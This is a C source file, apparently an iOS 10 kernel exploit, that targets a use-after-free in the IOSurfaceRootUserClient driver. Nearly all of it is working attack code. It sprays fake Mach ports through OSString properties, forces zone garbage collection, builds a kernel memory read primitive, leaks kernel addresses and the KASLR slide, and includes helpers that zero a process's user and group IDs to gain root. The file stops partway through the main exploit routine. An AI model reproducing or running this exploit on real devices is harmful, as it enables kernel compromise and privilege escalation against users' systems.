//
//  exploit.c
//  1032exploit
//
//  Created by Justin Sherman on 12/30/19.
//  Copyright Â© 2019 Justin Sherman. All rights reserved.
//

#include <CoreFoundation/CoreFoundation.h>
#include <errno.h>
#include <stdio.h>
#include <sys/sysctl.h>
#include <sys/types.h>

#include "exploit.h"

#define CHECK_ERROR(err, errmsg, ...) \
    do { \
        if((err)){ \
            printf(errmsg, ##__VA_ARGS__); \
            mach_ports_register(mach_task_self(), NULL, 0); \
            return FAILED; \
        } \
    } while (0)

static const int FAILED = 1;

static const int TASK_VMMAP_OFFSET = 0x20;
static const int TASK_ITK_REGISTERED_OFFSET = 0x2e8;
static const int TASK_BSDINFO_OFFSET = 0x360;

static const int PROC_PID_OFFSET = 0x10;
static const int PROC_TASK_OFFSET = 0x18;
static const int PROC_UCRED_OFFSET = 0x100;

static const int POSIX_CRED_CR_UID_OFFSET = 0x18;
static const int POSIX_CRED_CR_RUID_OFFSET = 0x1c;
static const int POSIX_CRED_CR_SVUID_OFFSET = 0x20;
static const int POSIX_CRED_CR_RGID_OFFSET = 0x68;
static const int POSIX_CRED_CR_SVGID_OFFSET = 0x6c;

static const int UCRED_CR_LABEL_OFFSET = 0x78;

/* pipe stuff */
static const int PIPE_PIPEBUF_BUFFER_OFF = 0x10;
/* these offsets were found in fp_getfvp */
static const int PROC_P_FD_OFFSET = 0x108;
static const int FILEDESC_FD_OFILES_OFFSET = 0;
static const int FILEDESC_FD_NFILES_OFFSET = 0x20;
static const int FILEPROC_F_FGLOB_OFFSET = 0x8;
/* these offsets were found in mac_file_setxattr */
static const int FILEGLOB_FG_OPS_OFFSET = 0x28;
static const int FILEGLOB_FO_TYPE_OFFSET = 0;
static const int FILEGLOB_FG_DATA_OFFSET = 0x38;

/* so we can tell which pipe we wrote to if our process has multiple pipes */
static const uint64_t PIPE_MAGIC = 0x1133557799bbddff;

static const int PAGES_TO_SPRAY = 1000;

static vm_size_t PAGESIZE = 0;
static size_t SPRAY_DICT_SZ = 0;

/* I use ipc_port->ip_context to store metadata about where our fake port got
 * reallocated.
 *       |63                           32 31|           16 15|            0
 *       ******************************** **************** ****************
 *           fake port context magic        OSString key    OSString offset
 *
 * Because the length of each OSString sprayed is equal to the page size,
 * and we spray tons of fake ports on a given OSString, we need a way to
 * figure out which fake port was reallocated.
 */
static const vm_address_t CONTEXT_MAGIC_MASK = 0xffffffff00000000;
static const vm_address_t CONTEXT_KEY_MASK = 0x00000000ffff0000;
static const vm_address_t CONTEXT_OFFSET_MASK = 0x000000000000ffff;
static const vm_address_t CONTEXT_MAGIC = 0xaabbccdd;

#define MAGIC_FROM_CONTEXT(ctx) (((ctx) & CONTEXT_MAGIC_MASK) >> 32)
#define KEY_FROM_CONTEXT(ctx) (((ctx) & CONTEXT_KEY_MASK) >> 16)
#define OFFSET_FROM_CONTEXT(ctx) ((ctx) & CONTEXT_OFFSET_MASK)

static kern_return_t _EarlyKernelRead32(mach_port_t uafport, uint64_t kaddr,
        uint32_t *out){
    if(!out)
        return KERN_INVALID_ARGUMENT;

    /* kernel will dereference this 32-bit field:
     *  uafport->ip_requests->name.size->its_size
     *  aka LDR Wn, [Xn+0]
     * Xn = uafport->ip_requests->name.size
     * we control Xn through uafport->ip_context
     */
    kern_return_t kret = mach_port_set_context(mach_task_self(), uafport, kaddr);

    if(kret)
        return kret;

    uint32_t value = 0;
    mach_msg_type_number_t count = MACH_PORT_DNREQUESTS_SIZE_COUNT;

    kret = mach_port_get_attributes(mach_task_self(), uafport,
            MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)&value,
            &count);

    if(kret != KERN_SUCCESS)
        return kret;

    *out = value;

    return kret;
}

static kern_return_t _EarlyKernelRead64(mach_port_t uafport, uint64_t kaddr,
        uint64_t *out){
    uint32_t out1 = 0;
    uint32_t out2 = 0;

    kern_return_t kret = KERN_SUCCESS;

    if((kret = _EarlyKernelRead32(uafport, kaddr, &out1)) != KERN_SUCCESS)
        return kret;

    if((kret = _EarlyKernelRead32(uafport, kaddr + 4, &out2)) != KERN_SUCCESS)
        return kret;

    *out = ((uint64_t)out2 << 32) | out1;

    return kret;
}

/* modified from iosdbg/source/memutils.c */
static kern_return_t _DumpKernelMemory(mach_port_t uafport, uint64_t kaddr,
        uint32_t len){
    kern_return_t kret = KERN_SUCCESS;

    uint32_t bytes_dumped = 0;
    uint64_t current_loc = kaddr;

    while(bytes_dumped < len){
        enum { row_size = 0x10 };

        uint64_t val1 = 0;
        uint64_t val2 = 0;

        kret = _EarlyKernelRead64(uafport, current_loc, &val1);

        if(kret)
            return kret;

        kret = _EarlyKernelRead64(uafport, current_loc + 8, &val2);

        if(kret)
            return kret;

        uint64_t *buf1 = &val1;
        uint64_t *buf2 = &val2;

        int current_row_length = len - bytes_dumped;

        if(current_row_length >= row_size)
            current_row_length = row_size;

        printf("  %#llx: ", current_loc);

        for(int i=0; i<current_row_length / 2; i++)
            printf("%02x ", *(uint8_t *)((uint8_t *)buf1 + i));
        for(int i=current_row_length / 2; i<current_row_length; i++)
            printf("%02x ", *(uint8_t *)((uint8_t *)buf2 + (i-(current_row_length/2))));

        /* Print filler spaces.
         * Two spaces for would be '%02x', one more for the space after.
         */
        for(int i=current_row_length; i<row_size; i++)
            printf("   ");

        printf("  ");

        for(int i=0; i<current_row_length / 2; i++){
            uint8_t cur_char = *(uint8_t *)((uint8_t *)buf1 + i);
            if(isgraph(cur_char))
                printf("%c", cur_char);
            else
                printf(".");
        }
        for(int i=current_row_length / 2; i<current_row_length; i++){
            uint8_t cur_char = *(uint8_t *)((uint8_t *)buf2 + (i-(current_row_length/2)));
            if(isgraph(cur_char))
                printf("%c", cur_char);
            else
                printf(".");
        }

        printf("\n");

        bytes_dumped += row_size;
        current_loc += row_size;
    }

    return kret;
}

/* simplify calling the three functions above */
#define EarlyKernelRead32(kaddr, out) \
    _EarlyKernelRead32(target_port, (kaddr), (out))

#define EarlyKernelRead64(kaddr, out) \
    _EarlyKernelRead64(target_port, (kaddr), (out))

#define DumpKernelMemory(kaddr, len) \
    _DumpKernelMemory(target_port, (kaddr), (len))

/* modified from iosdbg/source/memutils.c */
static kern_return_t KernelRead(mach_port_t tfp0, vm_address_t kaddr,
       void *buffer, vm_size_t length){
    vm_address_t current_loc = kaddr;
    vm_address_t end = kaddr + length;

    vm_size_t bytes_read = 0;
    vm_size_t bytes_left = length;

    kern_return_t kret = KERN_SUCCESS;

    while(current_loc < end && kret == KERN_SUCCESS){
        vm_size_t chunk = 0x100;

        if(chunk > bytes_left)
            chunk = bytes_left;

        kret = vm_read_overwrite(tfp0, current_loc, chunk,
                (vm_address_t)((uint8_t *)buffer + bytes_read), &chunk);

        bytes_read += chunk;
        current_loc += chunk;
        bytes_left -= chunk;
    }

    return kret;
}

static kern_return_t KernelWrite(mach_port_t tfp0, vm_address_t kaddr,
        uint64_t data, mach_msg_type_number_t size){
    return vm_write(tfp0, kaddr, (vm_offset_t)&data, size);
}

static int root(mach_port_t tfp0, uint64_t creds, uid_t *orig_uid,
        uid_t *orig_ruid, uid_t *orig_svuid, gid_t *orig_rgid, gid_t *orig_svgid){
    kern_return_t kret = KernelRead(tfp0, creds + POSIX_CRED_CR_UID_OFFSET,
            orig_uid, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_uid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_RUID_OFFSET, orig_ruid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_ruid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_SVUID_OFFSET, orig_svuid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svuid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_RGID_OFFSET, orig_rgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_rgid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_SVGID_OFFSET, orig_svgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svgid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_UID_OFFSET, 0, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_uid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RUID_OFFSET, 0, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_ruid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVUID_OFFSET, 0, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svuid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RGID_OFFSET, 0, sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_rgid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVGID_OFFSET, 0, sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svgid: %s\n",
            mach_error_string(kret));

    return 0;
}

static int unroot(mach_port_t tfp0, uint64_t creds, uid_t orig_uid,
        uid_t orig_ruid, uid_t orig_svuid, gid_t orig_rgid, gid_t orig_svgid){
    kern_return_t kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_UID_OFFSET,
            orig_uid, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_uid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RUID_OFFSET, orig_ruid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_ruid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVUID_OFFSET, orig_svuid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_svuid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RGID_OFFSET, orig_rgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_rgid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVGID_OFFSET, orig_svgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_svgid: %s\n",
            mach_error_string(kret));

    return 0;
}

static void my_mach_zone_force_gc(void){
    mach_port_t recv_port;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int kalloc_zone = 32768;

    /* in the kernel, each port will be an 8 byte pointer, purpose of this
     * is to make the largest allocation we can for a given zone
     */
    int port_count = kalloc_zone / 8;
    /* calloc for MACH_PORT_NULL */  
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    /* shoving 16mb into kalloc.32768 works really well */
    int msgcount = 512;

    for(int i=0; i<msgcount; i++){
        mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
                MACH_PORT_NULL, 0, MACH_PORT_NULL);
    }

    free(oolmsg);
    free(ports);

    mach_port_destroy(mach_task_self(), recv_port);
}

static void create_spray_dict(kport_t *fakeport, uint32_t surface_id,
        char **spray_dict_out){
    const uint32_t OSString_len = (uint32_t)PAGESIZE;

    uint32_t *spray_dict = malloc(SPRAY_DICT_SZ);
    const uint32_t *spray_dict_start = spray_dict;

    *(spray_dict)++ = surface_id;
    *(spray_dict)++ = 0;
    *(spray_dict)++ = kOSSerializeBinarySignature;
    *(spray_dict)++ = kOSSerializeArray | 1 | kOSSerializeEndCollection;
    *(spray_dict)++ = kOSSerializeDictionary | PAGES_TO_SPRAY | kOSSerializeEndCollection;

    for(uint32_t i=0; i<PAGES_TO_SPRAY; i++){
        *(spray_dict)++ = kOSSerializeSymbol | 4;
        /* key */
        *(spray_dict)++ = i;
        *spray_dict = kOSSerializeString | (OSString_len - 1);

        if(i+1 == PAGES_TO_SPRAY)
            *spray_dict |= kOSSerializeEndCollection;

        spray_dict++;

        const uint8_t *current_OSString_end = (uint8_t *)spray_dict +
            (OSString_len - 1);

        uint32_t fakeport_off = 0;

        while((uint8_t *)spray_dict + sizeof(kport_t) < current_OSString_end){
            fakeport->ip_context = (CONTEXT_MAGIC << 32) | (i << 16) | 
                (fakeport_off++ * sizeof(kport_t));

            memcpy(spray_dict, fakeport, sizeof(kport_t));
            spray_dict += (sizeof(kport_t) / sizeof(uint32_t));
        }

        while(spray_dict < current_OSString_end)
            *(spray_dict)++ = 0x41414141;
    }

    *spray_dict_out = spray_dict_start;
}

static int realloc_with_fakeport(kport_t *fakeport, mach_port_t connection,
        int surface_id, mach_port_t *uafportout){
    char *spray_dict = NULL;
    create_spray_dict(fakeport, surface_id, &spray_dict);

    int num_sprayed_ports_before = 0x2000;
    int num_sprayed_ports_after = 0x2000;

    mach_port_t sprayed_ports_before[num_sprayed_ports_before];
    mach_port_t sprayed_ports_after[num_sprayed_ports_after];

    for(int i=0; i<num_sprayed_ports_before; i++){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                &sprayed_ports_before[i]);
    }

    mach_port_t uafport = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
            &uafport);

    mach_port_insert_right(mach_task_self(), uafport, uafport,
            MACH_MSG_TYPE_MAKE_SEND);

    for(int i=0; i<num_sprayed_ports_after; i++){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                &sprayed_ports_after[i]);
    }

    for(int i=0; i<num_sprayed_ports_before; i++)
        mach_port_destroy(mach_task_self(), sprayed_ports_before[i]);

    uint64_t refs = 0;
    uint64_t input[] = { 0, 0x4141, 0 };

    IOConnectCallAsyncStructMethod(connection, 17, uafport, &refs, 1, input,
            sizeof(input), NULL, NULL);
    IOConnectCallAsyncStructMethod(connection, 17, uafport, &refs, 1, input,
            sizeof(input), NULL, NULL);
    IOConnectCallStructMethod(connection, 18, input, sizeof(input), NULL, NULL); 

    for(int i=0; i<num_sprayed_ports_after; i++)
        mach_port_destroy(mach_task_self(), sprayed_ports_after[i]);

    /* send the freed ipc.ports pages back to the zone allocator */
    my_mach_zone_force_gc();

    /* wait for garbage collection to be done */
    sleep(1);

    /* stick spray_dict into kernel memory, hopefully we can reallocate on
     * top of our uaf port
     */
    uint32_t output = 0;
    size_t output_sz = sizeof(output);
    IOConnectCallStructMethod(connection, IOSURFACE_SET_PROPERTY,
            spray_dict, SPRAY_DICT_SZ, &output, &output_sz);

    free(spray_dict);
    spray_dict = NULL;

    *uafportout = uafport;

    return 0;
}

static kern_return_t get_fakeport_from_OSString(mach_port_t connection,
        uint32_t surface_id, uint32_t key, uint32_t off, kport_t **port_out){
    uint32_t retrieve_dict[] = { surface_id, 0, key };

    /* a 16 byte header + the OSString is given back */
    size_t out_cnt = PAGESIZE + 0x10;
    char *out = malloc(out_cnt);

    kern_return_t kret = IOConnectCallStructMethod(connection, IOSURFACE_RETRIEVE_PROPERTY,
            retrieve_dict, sizeof(retrieve_dict), out, &out_cnt);

    if(kret){
        free(out);
        return kret;
    }

    kport_t *port = malloc(sizeof(kport_t));
    memcpy(port, out + 0x10 + off, sizeof(kport_t));

    free(out);

    *port_out = port;

    return KERN_SUCCESS;
}

static kern_return_t realloc_OSString(mach_port_t connection, uint32_t surface_id,
        uint32_t key, kport_t *contents){
    uint32_t delete_dict[] = { surface_id, 0, key };

    uint32_t out = 0;
    size_t outsz = sizeof(out);

    kern_return_t kret = IOConnectCallStructMethod(connection, IOSURFACE_DELETE_PROPERTY,
            delete_dict, sizeof(delete_dict), &out, &outsz);

    if(kret)
        return kret;

    char *spray_dict = NULL;
    create_spray_dict(contents, surface_id, &spray_dict);

    out = 0;
    outsz = sizeof(out);

    kret = IOConnectCallStructMethod(connection, IOSURFACE_SET_PROPERTY,
            spray_dict, SPRAY_DICT_SZ, &out, &outsz);

    free(spray_dict);

    return kret;
}

static kern_return_t proc_pipes(mach_port_t target_port, uint64_t ourproc,
        uint64_t **pipes_out, int *pipecnt_out){
    uint64_t p_fd = 0;
    kern_return_t kret = EarlyKernelRead64(ourproc + PROC_P_FD_OFFSET, &p_fd);

    CHECK_ERROR(kret, "ourproc + PROC_P_FD_OFFSET: %s\n", mach_error_string(kret));

    uint64_t fd_ofiles = 0;
    kret = EarlyKernelRead64(p_fd + FILEDESC_FD_OFILES_OFFSET, &fd_ofiles);

    CHECK_ERROR(kret, "p_fd + FILEDESC_FD_OFILES_OFFSET: %s\n",
            mach_error_string(kret));

    uint32_t fd_nfiles = 0;
    kret = EarlyKernelRead32(p_fd + FILEDESC_FD_NFILES_OFFSET, &fd_nfiles);

    CHECK_ERROR(kret, "p_fd + FILEDESC_FD_NFILES_OFFSET: %s\n",
            mach_error_string(kret));

    int pipecnt = 0;
    uint64_t *pipes = NULL;

    for(uint32_t i=0; i<fd_nfiles; i++){
        uint64_t cur_ofile = 0;
        kret = EarlyKernelRead64(fd_ofiles + (i * sizeof(void *)), &cur_ofile);

        CHECK_ERROR(kret, "fd_ofiles + %#llx: %s\n", mach_error_string(kret),
                i * sizeof(void *));

        if(!cur_ofile)
            continue;

        uint64_t f_fglob = 0;
        kret = EarlyKernelRead64(cur_ofile + FILEPROC_F_FGLOB_OFFSET, &f_fglob);

        CHECK_ERROR(kret, "cur_ofile + FILEPROC_F_FGLOB_OFFSET: %s\n",
                mach_error_string(kret));

        if(!f_fglob)
            continue;

        uint64_t fg_ops = 0;
        kret = EarlyKernelRead64(f_fglob + FILEGLOB_FG_OPS_OFFSET, &fg_ops);

        CHECK_ERROR(kret, "f_fglob + FILEGLOB_FG_OPS_OFFSET: %s\n",
                mach_error_string(kret));

        uint32_t fo_type = 0;
        kret = EarlyKernelRead32(fg_ops + FILEGLOB_FO_TYPE_OFFSET, &fo_type);

        CHECK_ERROR(kret, "fg_ops + FILEGLOB_FO_TYPE_OFFSET: %s\n",
                mach_error_string(kret));

        uint64_t fg_data = 0;
        kret = EarlyKernelRead64(f_fglob + FILEGLOB_FG_DATA_OFFSET, &fg_data);

        CHECK_ERROR(kret, "f_fglob + FILEGLOB_FG_DATA_OFFSET: %s\n",
                mach_error_string(kret));

        if(fo_type == DTYPE_PIPE){
            /* fg_data points to a pipe struct */

            if(!pipes)
                pipes = malloc(sizeof(uint64_t) * ++pipecnt);
            else{
                uint64_t *pipes_rea = realloc(pipes, sizeof(uint64_t) * ++pipecnt);
                pipes = pipes_rea;
            }

            pipes[pipecnt - 1] = fg_data;
        }
    }

    *pipes_out = pipes;
    *pipecnt_out = pipecnt;
    
    return KERN_SUCCESS;
}

int exploit(mach_port_t *tfp0out){
    mach_timebase_info_data_t info = {0};
    mach_timebase_info(&info);
    uint64_t _start = mach_absolute_time();

    _host_page_size(mach_host_self(), &PAGESIZE);
    SPRAY_DICT_SZ = (5 * sizeof(uint32_t)) +
        (PAGES_TO_SPRAY * ((3 * sizeof(uint32_t)) + PAGESIZE));

    CFMutableDictionaryRef matching_dict = IOServiceMatching("IOSurfaceRoot");

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            matching_dict);

    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kret = IOServiceOpen(service, mach_task_self(), 0, &connection);

    /* we need to do this to derive the kernel slide later */
    mach_ports_register(mach_task_self(), &connection, 1);

    /* siguza */
    uint32_t create_dict[] = {
        kOSSerializeBinarySignature,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        kOSSerializeString | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, /* "IOSurfaceAllocSize" */
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000, 0x0,
    };

    /* create a new IOSurface struct to use its ID for spraying OSStrings */
    /* The only way to figure this out seems to be to stick IOConnectCallStructMethod
     * into a loop and let it try all possible sizes until it succeeds
     */
    /* iPhone 6,1 iOS 10.3.2 */
    size_t surface_sz = 0x3c8;
    char *surface = malloc(surface_sz);
    kret = IOConnectCallStructMethod(connection, IOSURFACE_CREATE, create_dict,
            sizeof(create_dict), surface, &surface_sz);

    CHECK_ERROR(kret, "Couldn't create a new IOSurface: %s\n", mach_error_string(kret));

    int surface_id = *(uint32_t *)((uint8_t *)surface + 0x10);
    
    printf("Got usable surface ID %d\n", surface_id);

    free(surface);
    surface = NULL;

    kport_t *fakeport = calloc(1, sizeof(kport_t));
    fakeport->ip_bits = io_makebits(1, IOT_PORT, IKOT_TASK);
    fakeport->ip_references = 100;
    fakeport->ip_lock.data = 0;
    fakeport->ip_lock.type = 0x11;

    /* XXX don't comment this out... will cause ipc_port_nsrequest @ osfmk/ipc/ipc_port.c
     * to bail and set notify port to NULL later
     */
    fakeport->ip_srights = 99;

    mach_port_t target_port = MACH_PORT_NULL;

    realloc_with_fakeport(fakeport, connection, surface_id, &target_port);

    free(fakeport);
    fakeport = NULL;

    /* check if it was reallocated correctly */
    vm_address_t context = 0;
    kret = mach_port_get_context(mach_task_self(), target_port, &context);

    CHECK_ERROR(kret, "mach_port_get_context on target_port: %s\n",
            mach_error_string(kret));

    if(MAGIC_FROM_CONTEXT(context) == CONTEXT_MAGIC)
        printf("Got good context magic, context: %#lx\n", context);
    else{
        printf("Bad context %#lx\n", context);
        mach_ports_register(mach_task_self(), NULL, 0);
        return FAILED;
    }

    mach_port_t nosenderport = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &nosenderport);

    /* unused */
    mach_port_t prev = MACH_PORT_NULL;

    /* to disclose address of nosenderport later */
    /* kernel will set ip_nsrequest field of our fake port to point to nosenderport */
    kret = mach_port_request_notification(mach_task_self(), target_port,
            MACH_NOTIFY_NO_SENDERS, 0, nosenderport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);

    CHECK_ERROR(kret, "mach_port_request_notification with nosenderport on"
                " target_port failed: %s\n", mach_error_string(kret));

    uint32_t OSString_key = KEY_FROM_CONTEXT(context);
    uint32_t OSString_off = OFFSET_FROM_CONTEXT(context);

    printf("Our fake port was allocated %#x bytes from OSString %d\n",
            OSString_key, OSString_off);

    CHECK_ERROR(OSString_key > PAGES_TO_SPRAY, "Key is larger than "
            "PAGES_TO_SPRAY (%d)????\n", PAGES_TO_SPRAY);

    kport_t *reclaimed_fakeport = NULL;
    kret = get_fakeport_from_OSString(connection, surface_id, OSString_key,
            OSString_off, &reclaimed_fakeport);

    CHECK_ERROR(kret, "(1) Couldn't read back our fake port: %s\n",
            mach_error_string(kret));

    uint64_t nosenderport_kaddr = reclaimed_fakeport->ip_nsrequest;

    printf("nosenderport is at %#llx\n", nosenderport_kaddr);

    free(reclaimed_fakeport);
    reclaimed_fakeport = NULL;

    /* now disclose the address of target_port */
    prev = MACH_PORT_NULL;
    kret = mach_port_request_notification(mach_task_self(), target_port,
            MACH_NOTIFY_NO_SENDERS, 0, target_port, MACH_MSG_TYPE_MAKE_SEND_ONCE,
            &prev);

    CHECK_ERROR(kret, "mach_port_request_notification with target_port on"
                " target_port failed: %s\n", mach_error_string(kret));

    kret = get_fakeport_from_OSString(connection, surface_id, OSString_key,
            OSString_off, &reclaimed_fakeport);

    CHECK_ERROR(kret, "(2) Couldn't read back our fake port: %s\n",
            mach_error_string(kret));

    uint64_t targetport_kaddr = reclaimed_fakeport->ip_nsrequest;

    printf("target_port is at %#llx\n", targetport_kaddr);

    /* make target_port->ip_requests point 8 bytes from ip_context so we can
     * update target_port->ip_requests->name.size with mach_port_set_context
     */
    reclaimed_fakeport->ip_requests = targetport_kaddr + 
        (offsetof(kport_t, ip_context) - offsetof(struct ipc_port_request, name.size));

    kret = realloc_OSString(connection, surface_id, OSString_key, reclaimed_fakeport);

    CHECK_ERROR(kret, "Couldn't reallocate our fake port for early kreads: %s\n",
            mach_error_string(kret));

    /* XXX don't free reclaimed_fakeport, we still need it */

    context = 0;
    kret = mach_port_get_context(mach_task_self(), target_port, &context);

    CHECK_ERROR(kret, "second mach_port_get_context on target_port: %s\n",
            mach_error_string(kret));

    if(MAGIC_FROM_CONTEXT(context) == CONTEXT_MAGIC)
        printf("Got good context magic, context: %#lx\n", context);
    else{
        printf("Bad context %#lx\n", context);
        mach_ports_register(mach_task_self(), NULL, 0);
        return FAILED;
    }

    OSString_key = KEY_FROM_CONTEXT(context);
    OSString_off = OFFSET_FROM_CONTEXT(context);

    printf("For kreads, target_port was reallocated %#x bytes from OSString %d\n",
            OSString_key, OSString_off);

    uint64_t receiver_kaddr = 0;
    kret = EarlyKernelRead64(nosenderport_kaddr + offsetof(kport_t, ip_receiver),
            &receiver_kaddr);

    CHECK_ERROR(kret, "Couldn't find nosenderport's ip_receiver? %s\n",
            mach_error_string(kret));

    uint64_t ourtask_kaddr = 0;
    kret = EarlyKernelRead64(receiver_kaddr + offsetof(struct ipc_space, is_task),
            &ourtask_kaddr);

    CHECK_ERROR(kret, "Couldn't find nosenderport's ip_receiver's task? %s\n",
            mach_error_string(kret));

    printf("Our task struct is at %#llx\n", ourtask_kaddr);

    uint64_t itk_registered_kaddr = 0;
    kret = EarlyKernelRead64(ourtask_kaddr + TASK_ITK_REGISTERED_OFFSET,
            &itk_registered_kaddr);

    CHECK_ERROR(kret, "Couldn't find our task's registered send rights? %s\n",
            mach_error_string(kret));

    uint64_t kern_ipc_space_kaddr = 0;
    kret = EarlyKernelRead64(itk_registered_kaddr + offsetof(kport_t, ip_receiver),
            &kern_ipc_space_kaddr);

    CHECK_ERROR(kret, "Couldn't get pointer to kernel's ipc_space: %s\n",
            mach_error_string(kret));

    printf("Kernel's ipc_space struct is at %#llx\n", kern_ipc_space_kaddr);

    uint64_t connection_kobject_kaddr = 0;
    kret = EarlyKernelRead64(itk_registered_kaddr + offsetof(kport_t, ip_kobject),
            &connection_kobject_kaddr);

    CHECK_ERROR(kret, "Couldn't find connection's ip_kobject? %s\n",
            mach_error_string(kret));

    uint64_t IOSurfaceRootUserClient_vtable_kaddr = 0;
    kret = EarlyKernelRead64(connection_kobject_kaddr,
            &IOSurfaceRootUserClient_vtable_kaddr);

    CHECK_ERROR(kret, "Couldn't get IOSurfaceRootUserClient's vtable? %s\n",
            mach_error_string(kret));

    printf("IOSurfaceRootUserClient's vtable is at %#llx\n",
            IOSurfaceRootUserClient_vtable_kaddr);

    uint64_t some_kfxn = 0;
    kret = EarlyKernelRead64(IOSurfaceRootUserClient_vtable_kaddr, &some_kfxn);

    CHECK_ERROR(kret, "Couldn't read first fxn from vtable: %s\n",
            mach_error_string(kret));

    printf("Got some function at %#llx from vtable\n", some_kfxn);

    uint64_t kaddr = some_kfxn;
    kaddr &= ~0x3fff;

    uint64_t kernel_base = 0;

    for(;;){
        uint32_t val = 0;
        kret = EarlyKernelRead32(kaddr, &val);

        CHECK_ERROR(kret, "finding kbase: %s, kaddr %#llx\n",
                mach_error_string(kret), kaddr);

        /* 64 bit mach-o magic */
        if(val == 0xfeedfacf){
            kernel_base = kaddr;
            break;
        }

        kaddr -= 0x4000;
    }

    uint64_t kernel_slide = kernel_base - 0xfffffff007004000;

    printf("Kernel base %#llx, kernel slide %#llx\n", kernel_base, kernel_slide);

    uint64_t ourproc_kaddr = 0;
    kret = EarlyKernelRead64(ourtask_kaddr + TASK_BSDINFO_OFFSET, &ourproc_kaddr);

    CHECK_ERROR(kret, "Couldn't find our proc struct in kernel memory: %s\n",
            mach_error_string(kret));

    printf("Our proc struct is at %#llx\n", ourproc_kaddr);

    uint64_t ourproc_ucred_addr = 0;
    kret = EarlyKernelRead64(ourproc_kaddr + PROC_UCRED_OFFSET, &ourproc_ucred_addr);

    CHECK_ERROR(kret, "Couldn't get pointer to our proc's credentials: %s\n",
            mach_error_string(kret));

    printf("Our proc's credentials are at %#llx\n", ourproc_ucred_addr);

